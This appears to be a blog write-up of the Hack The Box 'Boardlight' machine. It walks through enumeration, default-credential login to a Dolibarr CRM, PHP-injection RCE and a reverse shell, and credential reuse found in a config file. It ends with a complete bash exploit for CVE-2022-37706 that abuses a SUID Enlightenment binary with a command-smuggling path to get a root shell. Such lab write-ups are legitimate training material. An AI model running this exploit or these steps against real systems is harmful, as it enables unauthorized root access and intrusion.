---
layout: post
title: "[HTB] Boardlight"
slug: "boardlight"
date: "2024-10-04"
comments: false
categories:
  - hacking
tags:
  - ctf
  - cve
  - hack the box
  - crm
---

### Enumeration
**IP**: 10.10.11.11

#### Nmap

```bash
> nmap -sC -sV -v 10.10.11.11
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
8080/tcp open  http    PHP cli server 5.5 or later (PHP 7.4.3-4ubuntu2.22)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/administrator/
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
8081/tcp open  http    PHP cli server 5.5 or later (PHP 7.4.3-4ubuntu2.22)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/administrator/
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have a few ports open, let us enumerate the `http` port first.

![img](/images/boardlight/index.png)

We can see that `info@board.htb` is written in about section. We let's add that as the hostname to our given ip address.

![img](/images/boardlight/board.htb.png)

Enumerating subdomain using vhosts we have a hit.

![img](/images/boardlight/crm.board.png)

Let's add `crm.board.htb` to our `/etc/hosts` and enumerate it.

We found a login page for a `crm`.
![img](/images/boardlight/crm.board.index.png)

On googling the version number of the crm software we find that there is a cve.
[CVE-2023-30253](https://www.swascan.com/security-advisory-dolibarr-17-0-0/). Searching for POC we get a [starlabs.sg](https://starlabs.sg/advisories/23/23-4197/)

So we have authenticated rce by injecting php code. Our initial step is to find credentials for authentication. After googling for default credentials, we can try `admin:admin`.

![img](/images/boardlight/dashboard.crm.png)

Add `<?php ?>` tags to the payload in the **POC**.

![img](/images/boardlight/poc.png)

We get RCE and executed a command. Now create a listener on your host and get a reverse shell.

![img](/images/boardlight/cmd.png)

![img](/images/boardlight/nc.png)

Navigating to `/home` we get a user `larissa`. After some investigation into `/var/www/html/crm.board.htb` we find `conf.php` at `/var/www/html/crm.board.htb/htdocs/conf/conf.php`.

![](/images/boardlight/conf.png)

So we have `dolibarrowner:serverfun2$2023!!` as credentials. Reuse the password with `larissa`

We can ssh with the credentials.

![img](/images/boardlight/ssh.png)

We now have user. Let's try to find escalation vectors for root.

Running `linpeas` on the system we find a binary with `SUID`bit set. So let's google the binary.

![img](/images/boardlight/enlightenment.png)

We find that there is a CVE and exploit from [exploitdb](https://www.exploit-db.com/exploits/51180)

Here is modified script for the exploit.
```bash
#!/bin/bash

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

We now have root.
![img](/images/boardlight/root.png)

Machine has been pwned.
![img](/images/boardlight/pwned.png)
